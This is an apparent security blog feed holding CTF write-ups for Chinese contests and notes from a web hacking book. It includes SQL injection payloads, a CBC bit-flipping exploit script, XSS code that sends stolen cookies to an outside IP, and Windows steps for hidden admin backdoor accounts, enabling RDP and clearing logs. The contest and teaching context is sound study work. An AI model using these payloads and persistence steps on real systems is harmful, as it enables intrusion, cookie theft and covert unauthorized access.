cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))    cookies_new={&#39;iv&#39;:iv,&#39;cipher&#39;:cipher_new}    cont=requests.get(url,cookies=cookies_new).content    plain=b64decode(re.findall(r&quot;base64_decode\(&#39;(.*?)&#39;\)&quot;,cont)[0])    first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;    iv_new=&#39;&#39;    for i in range(16):        iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))    iv_new=myencode(iv_new)    cookies_new={&#39;iv&#39;:iv_new,&#39;cipher&#39;:cipher_new}    cont=requests.get(url,cookies=cookies_new).content    print &#39;Payload:%s\n&gt;&gt; &#39; %(payload)    print cont    passdef foo():    pcat(&#39;12&#39;,4,&#39;2&#39;,&#39;#&#39;)    pcat(&#39;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&#39;+chr(0),6,&#39;2&#39;,&#39;u&#39;)    pcat(&#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&#39;+chr(0),7,&#39;2&#39;,&#39;u&#39;)    pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &#39;you_want&#39;)b join (select 3)c);&quot;+chr(0),7,&#39;2&#39;,&#39;u&#39;)    pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&#39;2&#39;,&#39;u&#39;)    passif __name__ == &#39;__main__&#39;:    foo()    print &#39;ok&#39;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实验吧web—writeup&quot;&gt;&lt;a href=&quot;#实验吧web—writeup&quot; class=&quot;headerlink&quot; title=&quot;实验吧web—writeup&quot;&gt;&lt;/a&gt;实验吧web—writeup&lt;/h1&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;h3 id=&quot;Form
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>第二届强网杯-部分wp</title>
    <link href="http://0xmj.club/2018/04/02/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%83%A8%E5%88%86wp/"/>
    <id>http://0xmj.club/2018/04/02/第二届强网杯-部分wp/</id>
    <published>2018-04-02T08:08:51.000Z</published>
    <updated>2018-04-02T08:09:14.519Z</updated>
    
    <content type="html"><![CDATA[<p>#第二届强网杯-部分wp</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>flag{welcome_to_qwb}</p><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><blockquote><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p></blockquote><p>第一关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252209_432.png" alt=""><br>这个就是标准的弱类型了<br>取md5之后为0e开头的字符串，如<br>param1=240610708<br>param2=s878926199a<br>第二关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252216_349.jpg" alt=""><br>考察php的弱类型和数组绕过基础，都是恨经典的题<br>这道题不能用弱类型绕过，但是可以用数组导致md5()函数报错返回空，空===空符合条件，得到Flag。<br>param1[]=1&amp;param2[]=2<br>第三关<br>这道题可以用hash碰撞解决，字符串：</p><pre><code>param1=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Apparam2=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803252223_324.png" alt=""></p><blockquote><p>另外还有一种方式可以把三关过掉就是使用md5碰撞</p></blockquote><pre><code>param1=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0Aj%18%B5%C3Q%0C%9A%82%CE%27%A4Cf%40%B1%FC%D6%DC%8D%DF%05%EB%B9%DF%5B%18%88%D4%A6%05%956%BC%EC-%3E%90%0F%26%FA%2C%AA%21%25%20g%A7%DB%EA%DB%89%05%A7%07%0D%14dS%20S%FB%90%B5%8A%C4T%E5%B2L%20%95%1C6%CD%17N%CE-%80%7B%9C%1E%8DN%26%1A%3A%11%BA%9E%B4%11%BD%04%99%0F%E1%9D%C4%D3%E2%D8%9E%B8%E6%7F%B3%E9%06&amp;param2=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0A%EA%18%B5%C3Q%0C%9A%82%CE%27%A4Cf</code></pre><p>##welcome<br>改名.jpg<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260100_207.png" alt=""><br>放入stegsolve<br>stereogram slover移位操作<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260104_53.png" alt=""><br>offset 80</p><h2 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201803261418_523.png" alt=""><br>发现js有rpo漏洞，其中内容可由编写的文章成为js。<br>参考文章：blog.nsfocus.net/rpo-attack/<br><a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p><p><a href="http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f</a></p><p>提示是Try to get the cookie of path “/QWB_fl4g/QWB/”获取目录下的cookie<br>所以先获取了一下cookie，发现没有flag</p><pre><code>b=document.cookie;a=&quot;&lt;img src=//115.29.36.83:23338/&quot;+btoa(b)+&quot;&gt;&quot;;document.write(a);</code></pre><p>但是有提示是Try to get the cookie of path “/QWB_fl4g/QWB/“</p><p>那就是获取目录下的cookie</p><pre><code>var i = document.createElement(&quot;iframe&quot;);i.setAttribute(&quot;src&quot;, &quot;/QWB_fl4g/QWB/&quot;);document.body.appendChild(i);i.addEventListener( &quot;load&quot;, function(){  var content = i.contentWindow.document.cookie;  location=&#39;//115.29.36.83:23338/&#39;+btoa(content);}, false);</code></pre><p>再利用eval包含住String.fromCharCode即可，payload长度还有些限制。</p><p>QWB{flag_is_f43kth4rpo}</p><h2 id="streamgame1"><a href="#streamgame1" class="headerlink" title="streamgame1"></a>streamgame1</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>发现可以爆破<br>所以写如下脚本</p><pre><code>python# coding=utf-8  def lfsr(R, mask):      output = (R &lt;&lt; 1) &amp; 0xffffff    i = (R &amp; mask) &amp; 0xffffff    lastbit = 0     while i != 0:          lastbit ^= (i &amp; 1)          i = i &gt;&gt; 1    output ^= lastbit      return (output, lastbit)  def main1(flag):      R = flag     mask = 0b1010011000100011100    f = open(&quot;key1&quot;, &quot;wb&quot;)      for i in range(12):    tmp = 0     for j in range(8):              (R, out) = lfsr(R, mask)              tmp = (tmp &lt;&lt; 1) ^ out          f.write(chr(tmp))      f.close()  key = open(&#39;key&#39;, &#39;rb&#39;)  key1 = key.read()  for x in range(524288, -1, -1):      main1(x)      key2 = open(&#39;key1&#39;, &#39;rb&#39;)      result = key2.read()      if (result == key1):          print x          break     key2.close()</code></pre><p>爆破得到<br>481387<br><code>flag{1110101100001101011}</code></p><h2 id="streamgame2"><a href="#streamgame2" class="headerlink" title="streamgame2"></a>streamgame2</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>与上一道题相似脚本如下</p><pre><code>python# coding=utf-8  def lfsr(R, mask):      output = (R &lt;&lt; 1) &amp; 0xffffff     i = (R &amp; mask) &amp; 0xffffff     lastbit = 0     while i != 0:          lastbit ^= (i &amp; 1)          i = i &gt;&gt; 1     output ^= lastbit      return (output, lastbit)  def main1(flag):      R = flag      mask = 0x100002     f = open(&quot;key1&quot;, &quot;wb&quot;)      for i in range(12):          tmp = 0     for j in range(8):              (R, out) = lfsr(R, mask)              tmp = (tmp &lt;&lt; 1) ^ out          f.write(chr(tmp))      f.close()  key = open(&#39;key&#39;, &#39;rb&#39;)  key1 = key.read()  for x in range(0b111111111111111111111 \+ 1, -1, -1):      main1(x)      key2 = open(&#39;key1&#39;, &#39;rb&#39;)      result = key2.read()      if (result == key1):          print x          break     key2.close()</code></pre><p>flag{110111100101001101001}</p><h2 id="Three-hit-Web"><a href="#Three-hit-Web" class="headerlink" title="Three hit    Web"></a>Three hit    Web</h2><p>注册将用户名，密码，年龄写入数据库，登录过后将年龄显示出来<br>思路：每次注册一个用户，注入点放进age，登录查看</p><p>注册提交age显示只能为数字，age用16进制提交，16进制提交不会对%23url解码，所以用–代替</p><p>payload:</p><pre><code>username=Str3am1&amp;age=0x2d3636363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c322c332c34206c696d697420312c312d2d&amp;password=1</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/j0mydok06kpm0m5gailch3p9l7.png" alt=""></p><p>因为每次都会将年龄写入数据库里面，所以每次都需要修改年龄的值</p><pre><code>username=Str3am11&amp;age=0x2d36363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167292c332c34206c696d697420312c312d2d&amp;password=1</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/72x5eade9sy8pewomdvy5w0yq4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#第二届强网杯-部分wp&lt;/p&gt;
&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;flag{welcome_to_qwb}&lt;/p&gt;
&lt;h2 id=&quot;web签到&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>第八届Geek部分web</title>
    <link href="http://0xmj.club/2018/04/02/%E7%AC%AC%E5%85%AB%E5%B1%8AGeek%E9%83%A8%E5%88%86web/"/>
    <id>http://0xmj.club/2018/04/02/第八届Geek部分web/</id>
    <published>2018-04-02T08:07:05.000Z</published>
    <updated>2018-04-02T08:08:27.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第八届Geek部分web"><a href="#第八届Geek部分web" class="headerlink" title="第八届Geek部分web"></a>第八届Geek部分web</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="故道白云"><a href="#故道白云" class="headerlink" title="故道白云"></a>故道白云</h3><h4 id="方法一sqlmap："><a href="#方法一sqlmap：" class="headerlink" title="方法一sqlmap："></a>方法一sqlmap：</h4><p>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ –dbs<br>查找表<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag –tables<br>通过2中的表得出列名<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag -T flag –columns<br>获取字段的值<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag -T flag -C “f4ag” –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201711051714_889.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711052126_103.png" alt=""><br>SYC{HACKEr_By-cL0und}</p><h4 id="方法二手注："><a href="#方法二手注：" class="headerlink" title="方法二手注："></a>方法二手注：</h4><p>首先测试<br>这里写图片描述<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222316_785.png" alt=""><br>没有过滤#号，然后应该就知道干啥了</p><pre><code>http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select 1,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select SCHEMA_NAME,1 from information_schema.SCHEMATA limit 1,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select TABLE_NAME,1 from information_schema.TABLES where TABLE_SCHEMA=&#39;f1ag&#39; limit 0,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select COLUMN_NAME,1 from information_schema.COLUMNS where TABLE_NAME=&#39;flag&#39; limit 0,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select f4ag,1 from f1ag.flag%23</code></pre><p>SYC{HACKEr_By-cL0und}</p><h3 id="粗心的李超"><a href="#粗心的李超" class="headerlink" title="粗心的李超"></a>粗心的李超</h3><p>通过dirb扫描后台</p><p>备份文件泄露，index.php.bak</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711222347_913.png" alt=""><br>flag:SYC{just_brute_is_ok!}</p><h3 id="Buy-me-a-Tesla"><a href="#Buy-me-a-Tesla" class="headerlink" title="Buy me a Tesla"></a>Buy me a Tesla</h3><p>一看sign参数就有猫腻<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222348_221.png" alt=""></p><p>发现就是url解密一下然后base64解密三次即可</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711222350_33.png" alt=""></p><p>反编码<br>带入sign</p><p>SYC{KeYiGeiWoMaiYiGeZhenDeTeslaMa?}</p><h3 id="PHP的悖论1"><a href="#PHP的悖论1" class="headerlink" title="PHP的悖论1"></a>PHP的悖论1</h3><p>题目：</p><p>链接：<a href="http://game.sycsec.com:2009/10111.php" target="_blank" rel="external">http://game.sycsec.com:2009/10111.php</a><br>解题思路：</p><p>1.题目的意思很明了，要post两个变量使得if语句成立拿flag。</p><p>了解了一下==，===，！=和！==的含义，这里po出来，也算是一种复习了。</p><p>Tips：a==b： 意思是a和b的值相等，但类型不需要相同。</p><p>a===b: 意思是a和b的值和类型都要相同。</p><p>!=和！===的区别和上述类似。</p><p>2.大致了解了基本含义之后剖析题目，这个if语句成立的条件是s1和s2的值和类型都不相同，并且其经过MD5加密之后的值和类型要完全相同。看起来有点绕，并且毫无思路。看了一个博客就get了，附上链接<a href="http://www.cnblogs.com/weidiao/p/6821812.html。" target="_blank" rel="external">http://www.cnblogs.com/weidiao/p/6821812.html。</a></p><p>3.可以知道，如果将s1和s2都变为数组，并且值不同，便可以满足if的条件，得到flag。<br>关键语句</p><pre><code>if ($_POST[&#39;s1&#39;] !== $_POST[&#39;s2&#39;] &amp;&amp; md5($_POST[&#39;s1&#39;]) === md5($_POST[&#39;s2&#39;])) { echo $flag; }</code></pre><p>这个很容易就想到是利用md5处理数组的漏洞了吧，构造如下即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222354_648.png" alt=""></p><h3 id="PHP的悖论2"><a href="#PHP的悖论2" class="headerlink" title="PHP的悖论2"></a>PHP的悖论2</h3><p>题目：</p><p><a href="http://game.sycsec.com:2009/20022.php" target="_blank" rel="external">http://game.sycsec.com:2009/20022.php</a></p><p>解题思路：<br>仔细看看会发现‘===’变成了‘==’，于是只需要值相等，网上搜了搜字符串不同但MD5相等</p><pre><code>if ($_POST[&#39;s1&#39;] !== $_POST[&#39;s2&#39;] &amp;&amp; md5($_POST[&#39;s1&#39;]) == md5($_POST[&#39;s2&#39;])) { echo $flag; }</code></pre><p>于是构造payload：<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222354_397.png" alt=""><br>240610708<br>s878926199a<br>SYC{Y0u_g0th3w4y_to_k111==}</p><h3 id="视频播放器"><a href="#视频播放器" class="headerlink" title="视频播放器"></a>视频播放器</h3><p>这个还是非常好玩儿的，利用的是一个ffmpeg的漏洞，这个原理有些厉害了，但是利用过程十分简单<br><a href="http://www.freebuf.com/vuls/138377.html" target="_blank" rel="external">http://www.freebuf.com/vuls/138377.html</a><br>然后下载源码，生成恶意文件<br>然后上传恶意文件即可读到flag<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222355_205.png" alt=""></p><p>SYC{WhatIsExpFuckNoLiaoDe???}</p><h3 id="iPhone-X"><a href="#iPhone-X" class="headerlink" title="iPhone X"></a>iPhone X</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>题目提示要iPhone X访问，需要UA头包含CPU iPhone OS X字样，之后提示IP不符合规则，同时修改xff和ref头尾127.0.0.1得到flag</p><pre><code>GET /web_competition/geekCompetition/web_3/ HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS X like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/13D15 UCBrowser/10.9.15.793 Mobile Gecko/20100101 Firefox/55.0Referer: 127.0.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3X-FORWARDED-FOR: 127.0.0.1Connection: closeUpgrade-Insecure-Requests: 1</code></pre><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>0x01 抓包<br>0x02 改包<br>由于题目说只有iphoneX才能接受这个website，所以联想到要将user-agent改为iPhone的版本。<br>如图，好不容易找到iphone的user-agent，它却说ip不对，改x-forward-for为127.0.0.1，没懂hh。用modify headers，于是来到第三步。<br><img src="http://oy0tigw51.bkt.clouddn.com/201711230000_413.png" alt=""></p><p>0x03 改IP</p><p>看网上的安装和使用的博客，于是得到如图<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222358_212.png" alt=""><br>0x04 Get_the_flag</p><p>改了之后重新抓包，改包，go了之后发现还是一样，黑人问号？？？一定是modify headers没用对，返回看了下，发现还要点个start，难受了。<br>再来一遍抓包改包，得到flag。</p><p>Tip：之后发现可以直接在repeater里加X-Forwarded-For:127.0.0.1，也能拿到flag。</p><p>SYC{UA_AND_IP_COULD_BE<em>FORGED</em>!!!}</p><h3 id="Clound的错误"><a href="#Clound的错误" class="headerlink" title="Clound的错误"></a>Clound的错误</h3><pre><code>http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=&#39;f1ag&#39; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#39;flag&#39; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,f4ag,0x7e) FROM f1ag.flag LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></pre><h3 id="大大的标题"><a href="#大大的标题" class="headerlink" title="大大的标题"></a>大大的标题</h3><p>首先看到了标题是upload是一个文件上传的问题，首先扫描一下目录直接发现存在源码泄露?1.zip文件下载得到源码<br>一开始最关键的代码在这里</p><p>$file_ext  = substr( $file_name, strrpos( $uploaded_name, ‘.’ ) + 1);</p><p>这个是检测最后一个点的位置，类似于解析漏洞是的，但是怎么也没想到就是单纯的后缀名过滤不全…<br>我们看着</p><p>$allow_ext=array(“php”,”php3”,”php4”,”php5”,”phpt”,”phtml”);</p><p>是不是少了什么…比如说.pht，结果随便一试试就出来了</p><p>SYC{CLound-upL0ad}</p><h3 id="Clound的错误2"><a href="#Clound的错误2" class="headerlink" title="Clound的错误2"></a>Clound的错误2</h3><p>过滤了空格用%a0绕过，过滤了注释用;%00绕过<br>过滤了or使用oorr绕过,过滤的其他关键词使用+绕过whe+re</p><pre><code>sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0group_concat(SCHEMA_NAME)%a0fr+om%a0infoorrmation_schema.SCHEMATA)),0x7e));%00sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0group_concat(table_name)%a0fr+om%a0infoorrmation_schema.tables%a0whe+re%a0table_schema=&#39;f1ag&#39;)),0x7e));%00sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0column_name%a0fr+om%a0infoorrmation_schema.columns%a0whe+re%a0table_name=&#39;flag&#39;%a0limit%a00,1)),0x7e));%00sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0f4ag%a0fr+om%a0f1ag.flag)),0x7e));%00</code></pre><p>flag:SYC{Err0R_sQl_inj2}</p><p>二进制不会慢慢学<br>re：<br><a href="http://www.cnblogs.com/L1B0/p/7763016.html" target="_blank" rel="external">http://www.cnblogs.com/L1B0/p/7763016.html</a><br><a href="http://blog.sycsec.com/" target="_blank" rel="external">http://blog.sycsec.com/</a><br><a href="http://blog.csdn.net/qq_35078631/article/details/78308518" target="_blank" rel="external">http://blog.csdn.net/qq_35078631/article/details/78308518</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第八届Geek部分web&quot;&gt;&lt;a href=&quot;#第八届Geek部分web&quot; class=&quot;headerlink&quot; title=&quot;第八届Geek部分web&quot;&gt;&lt;/a&gt;第八届Geek部分web&lt;/h1&gt;&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>黑客攻防web安全实战详解</title>
    <link href="http://0xmj.club/2018/02/27/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2web%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/"/>
    <id>http://0xmj.club/2018/02/27/黑客攻防web安全实战详解/</id>
    <published>2018-02-27T11:57:12.000Z</published>
    <updated>2018-02-27T11:57:48.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑客攻防web安全实战详解"><a href="#黑客攻防web安全实战详解" class="headerlink" title="黑客攻防web安全实战详解"></a>黑客攻防web安全实战详解</h1><p><img src="http://oy0tigw51.bkt.clouddn.com/201801051020_332.png" alt=""></p><h2 id="第一章：网络基础"><a href="#第一章：网络基础" class="headerlink" title="第一章：网络基础"></a>第一章：网络基础</h2><p>###计算机网络<br>IP协议和TCP/IP模型<br>ip地址一般为点分十进制，4段，例如192.168.1.1<br>cmd——&gt;ipconfig 查询本机ip地址</p><p>###端口<br>范围在0-65535<br>21端口：FTP服务<br>23端口：Telnet（远程登录）服务<br>25：SMTP发送邮件<br>80：HTTP<br>109、110：POP2，POP3.<br>135：RPC<br>137：NetBIOS<br>3389：远程桌面服务端口<br>5632：远程软件<br>8080：同80用于WWW代理服务</p><p>cmd——&gt;netstat -on可查看本机开放的端口</p><p>Web服务3种协议<br>HTTP-GET 和    HTTP-POST SOAP(XML web service最常用到的) </p><h2 id="第二章：信息搜索与社会工程"><a href="#第二章：信息搜索与社会工程" class="headerlink" title="第二章：信息搜索与社会工程"></a>第二章：信息搜索与社会工程</h2><p>whois查询域名的ip和所有者信息的传输协议<br>SEO综合查询  <a href="http://tool.chinaz.com/" target="_blank" rel="external">站长工具</a></p><h3 id="常见的端口扫描技术："><a href="#常见的端口扫描技术：" class="headerlink" title="常见的端口扫描技术："></a>常见的端口扫描技术：</h3><p>TCP connect()扫描<br>TCP SYN 扫描<br>TCP FIN扫描<br>实战端口扫描</p><ol><li><a href="http://tool.chinaz.com/port" target="_blank" rel="external">站长工具</a></li><li>scanport</li></ol><h3 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h3><p>1.wwwscan<br>2.御剑<br>3.safe3wvs</p><h3 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h3><p>1.APPscan<br>2.x-scan<br>3.nessus<br>4.在线扫描工具scanv<br>5.jsky<br>6.Awvs<br>7.webcruiser</p><h3 id="Googlehack"><a href="#Googlehack" class="headerlink" title="Googlehack"></a>Googlehack</h3><p>www.google.com/intl/xx-hacker 黑客专用入口<br>www.google.com/custom?hl=zh-CN 中文黑客专用信息和资料搜索地址<br>www.google.com/custom?hl=en 英文黑客专用信息和资料搜索地址</p><p>intext或allintext 搜索网站正文<br>intitle或allintitle 搜索网站标题<br>cache搜索缓存内容<br>define 查找关键字的定义<br>filetype：文件名.后缀名   例如：信息安全论文 filetype:doc<br>info搜索网站基本信息<br>inurl或allinurl</p><blockquote><p>inurl: admin/login.asp site:www.sina.con<br>就会搜索这个网站下的包含 admin/login.sap的链接<br>inurl:php?id=    搜索包含:php?id=的链接</p></blockquote><p>intitle 网站标题中包含了查询关键词的网页</p><blockquote><p>[攻防 intitle：实战]</p></blockquote><p>site 指定搜索一个站<br>intext 网站正文</p><blockquote><p>site:xx.com intext:管理<br> site:xx.com intext:manage<br>  site:xx.com intext:admin<br>  site:xx.com intitle:后台<br>   site:xx.com inurl:admin</p></blockquote><p>搜索网站目录<br>index<br>转到父目录<br>to parent directory</p><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><p>一切利用人自身漏洞的行为都属于社会工程学范畴</p><h3 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h3><p>net user test1 123 /add<br>其中test1 为用户名 123为密码</p><p>开启3389端口<br>“REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal””Server /v fDenyTSConnections /t REG_DWORD /d 0 /f”<br>提升用户权限：”net localgroup administrators test1 /add”<br>分别执行这两条命令，或者使用开启3389服务工具</p><h4 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h4><p>方法一：安装远控程序<br>方法二：建立隐蔽的用户，并将远程连接端口3389改为其他端口。<br>在建立用户帐户时，如果在用户名后面加上$符号，就可以建立一个简单的隐藏帐户，如“test$”。<br>在字符界面下执行net user命令，就无法查看到这个帐户，但是在图形界面的“本地用户和组”中仍然可以看到。在入侵了一台主机之后，一般都要想办法给自己留一个后门，而给自己加一个管理员组的帐户则是常用的手法。由于带“$”的帐户容易被发现，于是一些人就在帐户的显示名称上下功夫，建立一个看起来和系统帐户类似的名字来迷惑管理员，如admin、sysadmin、Billgates、root等。</p><pre><code>net user chun$ password /add net localgroup administrators chun$ /add 这样我们就利用“命令提示符”成功得建立了一个用户名为“chun$”，密码为“password”的简单“隐藏账户”，并且把该隐藏账户提升为了管理员权限</code></pre><p>方法三：<br>开始 –&gt; 运行 –&gt; regedit –&gt; 确定<br>依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp<br>分支，其下的”PortNumber”键值所对应的就是端口号，将其修改即可。上面设置完成后，需要再依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp<br>分支，同样将其下的”PortNumber”键值进行更改。<br>比如可以将端口改为13389</p><h4 id="清脚印"><a href="#清脚印" class="headerlink" title="清脚印"></a>清脚印</h4><p>推荐日志清除工具， aio.exe</p><h4 id="跨站脚本利用"><a href="#跨站脚本利用" class="headerlink" title="跨站脚本利用"></a>跨站脚本利用</h4><p>1.死循环</p><pre><code>&lt;script&gt;while(true)alert(&#39;炸死你！&#39;)&lt;/script&gt;</code></pre><p>2.隐藏访问</p><pre><code>&lt;script&gt;window.location.href=&quot;目标网站&quot;&lt;/script&gt;</code></pre><p>3.更加隐蔽访问</p><pre><code>&lt;iframe src=&quot;目标网站&quot; width=&quot;0&quot; height=&quot;0&quot;&gt; &lt;/iframe&gt;</code></pre><p>4.获取cookie</p><pre><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></pre><h3 id="web权限提升"><a href="#web权限提升" class="headerlink" 